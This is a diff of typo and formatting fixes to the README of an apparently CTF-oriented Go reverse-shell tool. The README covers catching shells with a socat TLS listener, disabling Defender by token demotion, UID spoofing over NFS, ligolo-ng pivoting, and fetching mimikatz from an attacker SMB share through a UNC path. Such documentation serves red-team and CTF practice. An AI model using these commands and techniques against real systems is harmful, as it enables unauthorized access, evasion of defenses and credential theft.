@@ -29,31 +29,31 @@ Generate the server with:
 $ make server LPORT=443
 ```
 
-Gen everything with `make all LHOST=example.com LPORT=443
+Gen everything with `make all LHOST=example.com LPORT=443`
 
 ### Catching the shell
 
-```sh
+```bash
 make listen LPORT=443
 ```
 
 Tmux is powerful terminal multiplexer with robust session/windows/pane management. 
 It works better at managing multiple reverse shells than most shell managers I've seen.
-The server binary creates a tmux sessions per host and a window per each reverse shell binary invocation.
+The server binary creates a tmux session per host and a window per each reverse shell binary invocation.
 If you run the `spawn` command on a shell, a new window will open in the host's session, creating a "tab".
 
-To not use `gorsh-server` and/or tmux:
+To catch a shell without `gorsh-server` and/or tmux, use:
 
 ```bash
-socat -d -d OPENSSL-LISTEN:8443,reuseaddr,cert=certs/server.pem,verify=0,fork READLINE
+socat -d -d OPENSSL-LISTEN:443,reuseaddr,cert=certs/server.pem,verify=0,fork READLINE
 ```
 
 ## Features
 
 - Network scanner
 - Ligolo-ng tunnels for socks-less pivoting
-- Tab completion
-- Duplicate your shells with one command
+- Tab completion (dependent on exec method)
+- Duplicate your shells with 'spawn'
 
 ### Windows
 - Disable Defender (or any process) by demoting process tokens to untrusted.
@@ -71,28 +71,37 @@ socat -d -d OPENSSL-LISTEN:8443,reuseaddr,cert=certs/server.pem,verify=0,fork RE
 #### Not Windows
 - `setuid`, useful for UID spoofing to bypass NFS "ACLs"
 - Enumeration scripts
-    - linpease
+    - linpeas
     - linenum
 
 ### Execute Assembly
 
-Assemblies are gzipped and embedded within the implant. Since this is a CTF shell, I'm optimizing for ease of use and not advanced tradecraft.
+Assemblies are gzipped and embedded within the implant. Since this is a CTF
+shell, I'm optimizing for ease of use and not tradecraft.
 
 - `make list-assemblies` will show available assemblies from Flangvik's SharpCollection project.
-- `make choose-assemblies` will bring up fzf, where you can filter and choose what binaries you want embedded. They will be embedded at the next build time.
+- `make choose-assemblies` will bring up fzf, where you can filter and choose
+what assemblies you want embedded. They will be embedded at the next build
+time.
 - to embed any other assemblies not in SharpCollection. gzip it and copy it to `./pkg/execute_assembly/embed/`
 
 ### Ligolo-NG Tunnels
 
-Agents have the ligolo client embedded. Run `make start-ligolo` to prepare interfaces and run ligolo.
-From an agent, run `pivot` and a callback should land within the litolo interface. Select the callback in ligolo and `start` routing. On your box, create a route to the remote network through the `tun` interface and all traffic to that destination will now egress through ligolo.
+Agents have the ligolo client embedded. Run `make start-ligolo` to prepare
+interfaces and run ligolo-ng. From an agent, run `pivot` and a callback should
+land within the ligolo interface. Select the callback in ligolo and `start`
+routing. On your box, create a route to the remote network through the `tun`
+interface and all traffic to that destination will now egress through ligolo.
 
 ```bash
-ip route add 172.16.43.0/24 dev ligol`
+ip route add 172.16.43.0/24 dev ligolo`
 ```
 
 ### File upload/download
 
-Since this is a reverse shell, only sharing its stdin/out/err through a network socket, traditional methods of uploading and downloading file aren't available. There's a docker smb server to bridge that gap. Configure the directories to be shared in the `Makefile`, then run `make start-smb`. If you wish to see logs so you can monitor callbacks, use `make smblogs`. Windows implants understand UNC paths, so something like `cp //myip/tools/mimikatz.exe .` is possible.
-
-## Resources and Acknowledgments
+Since this is a reverse shell, only sharing its stdin/out/err through a network socket, 
+traditional methods of uploading and downloading file aren't available. There's
+a docker smb server to bridge that gap. Configure the directories to be shared
+in the `Makefile`, then run `make start-smb`. If you wish to see logs so you
+can monitor callbacks, use `make smblogs`. Windows implants understand UNC
+paths, so something like `cp //myip/tools/mimikatz.exe .` is possible.
